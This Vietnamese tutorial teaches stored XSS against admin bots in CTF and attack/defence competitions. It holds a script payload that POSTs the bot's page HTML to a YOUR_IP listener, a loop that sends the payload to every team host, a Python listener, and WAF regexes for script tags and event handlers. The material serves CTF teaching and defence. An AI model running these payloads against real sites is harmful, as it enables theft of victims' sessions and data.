XSS + Admin Bot

Khi trang web hiển thị lại chữ bạn gõ ra màn hình mà không lọc, bạn chèn được code JavaScript chạy trong trình duyệt của người khác. Trong CTF, "người khác" thường là admin bot — 1 chương trình tự động (giống trình duyệt thật) do BTC chạy, ghé thăm URL bạn gửi, mang theo cookie/session chứa flag.

00 / TÓM TẮT 1 PHÚT

XSS + Admin Bot là gì, để làm gì?

XSS (Cross-Site Scripting): trang web lấy chữ bạn gõ (bình luận, tên hiển thị, tìm kiếm) và in thẳng vào HTML mà không "khử độc" — nếu bạn gõ <script>...</script>, trình duyệt của người xem trang đó (không phải máy bạn) sẽ chạy code này y như code của chính trang. Trong CTF có admin bot — bạn gửi 1 link cho bot, bot tự mở link đó bằng trình duyệt có sẵn cookie/session của "admin" (hoặc nạn nhân có flag), code XSS của bạn chạy trong phiên đó và gửi được dữ liệu (cookie, nội dung trang) về cho bạn.

Nếu chỉ nhớ một điều XSS một mình không lấy được gì cả nếu không có ai "xem" trang bị dính — trong CTF, chuỗi hành động luôn là: (1) tìm chỗ chèn được script → (2) gửi URL chứa script đó cho admin bot → (3) bot tự mở, script chạy, gửi dữ liệu về listener của bạn (không phải trả trực tiếp cho bạn như các bài trước).

⚠️ Gotcha + 🛡️ WAF 1 dòng Thẻ <script> hay bị lọc/chặn bởi CSP — dùng event handler (onerror, onload) hoặc thẻ khác (mục 06). Không có Internet trong A/D → listener PHẢI nằm trong mạng thi (xem mục 07). WAF rule nhanh: chặn regex <script|on\w+\s*=. Chưa hiểu? đọc tiếp dưới.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

DOM (Document Object Model) — cách trình duyệt biểu diễn 1 trang HTML thành cây các phần tử để JavaScript có thể đọc/sửa. Khi JS chạy trong trang, nó có toàn quyền với DOM của trang đó — đọc cookie, gửi request, sửa nội dung hiển thị.
Same-Origin Policy — quy tắc trình duyệt: JavaScript của 1 trang chỉ được phép đọc dữ liệu (cookie, nội dung DOM) của cùng origin (cùng domain+scheme+port). Đây chính là lý do XSS nguy hiểm — nếu bạn chèn được script VÀO trang thật của nạn nhân, script đó chạy với tư cách chính trang đó, vượt qua được rào cản Same-Origin Policy hoàn toàn hợp lệ.
Admin bot — 1 chương trình (thường dùng Puppeteer/Playwright/Selenium điều khiển Chrome headless) BTC chạy tự động, giả lập hành vi admin: đăng nhập, mở URL bạn cung cấp, rồi đóng lại. Flag nằm trong cookie/trang mà bot có quyền xem, bạn không có.

Code hay viết sai (in thẳng input không encode):

// Node/Express — EJS template không tự escape nếu dùng <%- thay <%=
<div>Bình luận: <%- comment %></div>   // <%- = KHÔNG escape, <%= = CÓ escape
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Trình duyệt không phân biệt được "dữ liệu hiển thị" với "code chạy"

HTML vốn dùng thẻ <...> để vừa đánh dấu cấu trúc vừa có thể chứa code (<script>). Khi server in thẳng input người dùng vào giữa HTML mà không "khử độc" (escape — biến < thành &lt; để trình duyệt hiểu là ký tự, không phải bắt đầu thẻ), trình duyệt của người xem trang đó sẽ hiểu nhầm chữ bạn gõ là cấu trúc HTML thật — y hệt bản chất của SQLi/Command Injection/LFI đã học, chỉ khác "ngôn ngữ nạn nhân" lần này là HTML+JS chạy trên trình duyệt người khác, không phải SQL/shell chạy trên server.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

3 bước: chèn → bot mở → exfiltrate

Điểm quan trọng nhất: bước (3) script chạy trong trình duyệt của bot, không phải trình duyệt của bạn — nên document.cookie lúc đó là cookie của bot (có quyền admin), dù chính bạn là người viết ra đoạn code đó. Đây là lý do XSS+bot nguy hiểm: bạn "mượn" được quyền của nạn nhân mà không cần biết mật khẩu họ.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Bước 1-2 — xác nhận XSS trước khi gửi cho bot
  1. Gõ payload test (<script>alert(1)</script>) vào ô nghi ngờ, submit.
  2. Burp bắt request, xem Response có chứa nguyên văn thẻ script không (không bị encode).
  3. Mở lại trang đó bằng trình duyệt thật (không chỉ xem trong Burp) để xác nhận alert có popup thật — Burp chỉ cho xem HTML thô, không tự chạy JavaScript.
Bước 3 — đổi payload test thành payload thật, báo cho bot Sau khi xác nhận XSS cơ bản ăn, sửa payload thành bản thật (fetch về listener của bạn — mục 06), submit lại, rồi tìm form "Report URL" trên trang, gửi đúng URL chứa payload đó.

07 / CÔNG CỤ THỰC CHIẾN: LISTENER & KHO PAYLOAD

Dựng listener nhận dữ liệu từ bot

A. Kho payload offline

~/hoc/CTF/Tools/web/PayloadsAllTheThings/XSS Injection/ và ~/hoc/CTF/Tools/web/SecLists/Fuzzing/XSS/ — nhiều biến thể bypass filter hơn bảng mục 06, dùng khi các payload mẫu không ăn.

B. Listener nhận dữ liệu — Python http.server (giống bài XXE)

# Dựng server đơn giản, tự in mọi request tới (bao gồm cookie/data exfil)
python3 -m http.server 8000

# Hoặc dùng server có log rõ hơn, bắt query string riêng
python3 -c "

    def do_GET(self):

Lưu ý A/D — không có InternetListener PHẢI chạy trên máy/IP nằm trong mạng thi đấu. Dùng đúng IP thật của máy bạn trong mạng đó (không phải 127.0.0.1 — đó là loopback của chính trình duyệt bot, không phải máy bạn). Hỏi BTC xem bot có route được tới IP đội mình không — nếu không, phải tìm cách lưu dữ liệu leak vào ngay 1 endpoint công khai của chính service rồi tự đọc lại (xem mục 11).

(B) Bản gọn chắc — kèm listener trong cùng script

import re, requests, threading
from http.server import HTTPServer, BaseHTTPRequestHandler

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
leaked = []

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        leaked.append(self.path)
        self.send_response(200); self.end_headers()
    def log_message(self, *args): pass   # tắt log mặc định cho gọn

def start_listener():
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()

threading.Thread(target=start_listener, daemon=True).start()

# Gửi payload + report cho bot (như bản A)
#  ... sau vài giây, kiểm tra 'leaked' xem có dữ liệu chưa
import time; time.sleep(10)
print("Dữ liệu nhận được:", leaked)

(C) Bản A/D tái dùng — chạy mọi đội, mọi round (chèn payload lấy từ chính nội dung HTML)

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
# payload tự exfiltrate luôn nội dung trang -- không cần listener riêng nếu có endpoint public để ghi lại
PAYLOAD = ("<script>fetch('http://YOUR_IP:8000/leak',{method:'POST',"
           "body:document.documentElement.outerHTML})</script>")

def exploit_xss(host):
    try:
        requests.post(f"http://{host}/comment", data={"text": PAYLOAD}, timeout=5)
        requests.post(f"http://{host}/report",
                data={"url": f"http://{host}/view/latest"}, timeout=5)
        return True   # việc lấy flag thật sự xảy ra ở listener, chạy riêng
    except requests.RequestException:
        return False

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        ok = exploit_xss(host)
        print(host, "đã gửi báo cáo cho bot" if ok else "lỗi")
# Chạy song song listener riêng để hứng dữ liệu trả về từ TẤT CẢ các đội
Khác biệt với các bài trướcScript khai thác XSS+bot KHÔNG trả flag ngay trong response của chính nó (vì bot mới là người "chạy" payload, không phải request của bạn) — luôn cần 1 listener chạy riêng, chờ dữ liệu từ bot gửi về sau một khoảng trễ.

10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Rule (regex)Khớp gì
(?i)<script[\s>]Thẻ script, không phân biệt hoa thường
(?i)on(error|load|toggle|click)\s*=Event handler phổ biến dùng trong XSS
(?i)<(img|svg|body|details)[^>]*on\w+=Thẻ hay bị lợi dụng kèm theo event handler
Tránh chặn nhầmNếu chức năng bình luận hợp lệ cho phép định dạng HTML (hiếm, nhưng có thể) thì rule này sẽ chặn nhầm. Đa số trường hợp bình luận/input text thường, không có lý do hợp lệ chứa thẻ <script> — rủi ro chặn nhầm ở đây tương đối thấp. Test DetectionOnly trước vẫn là bắt buộc.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App in input ra HTML không escape (hoặc escape thiếu 1 số ký tự), VÀ có cơ chế admin bot/nạn nhân xem trang đó.
❌App escape đúng mọi ký tự HTML đặc biệt (< > & " ') trước khi in ra.
❌Không có cơ chế admin bot/nạn nhân nào — XSS chỉ chạy được trên trình duyệt của chính bạn, vô dụng vì bạn tự có toàn quyền với session của mình rồi.
❌Có CSP nghiêm ngặt (script-src 'self', không unsafe-inline) — payload inline script bị chặn hoàn toàn trước khi chạy.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay, từ gõ bình luận thường tới khi nhận được cookie qua listener.

Gợi ý nếu kẹtLuôn tự mở lại trang bằng trình duyệt thật để xác nhận alert chạy — đừng chỉ tin vào việc Burp hiển thị thẻ script nguyên văn trong Response.

⭐⭐ Đổi 1 biến: app chặn thẻ <script> và img. Tìm thẻ HTML khác kèm event handler vẫn chạy được JavaScript.

Gợi ý nếu kẹtThử <svg onload=...> hoặc <body onload=...> (nếu payload chèn được ngay trong thẻ body) — xem mục 06.B.

⭐⭐⭐⭐ Tự nghĩ: cookie session có HttpOnly, CSP chặn connect-src ra ngoài domain. Thiết kế cách vẫn lấy được flag mà không cần đọc cookie hay fetch ra ngoài.

Gợi ý nếu kẹtDùng script để tự thực hiện 1 hành động ngay trong domain đó (vd submit 1 form "share this page publicly" thay bot) — biến flag từ "chỉ admin xem được" thành "công khai", rồi bạn đọc lại bằng request bình thường không cần XSS nữa.
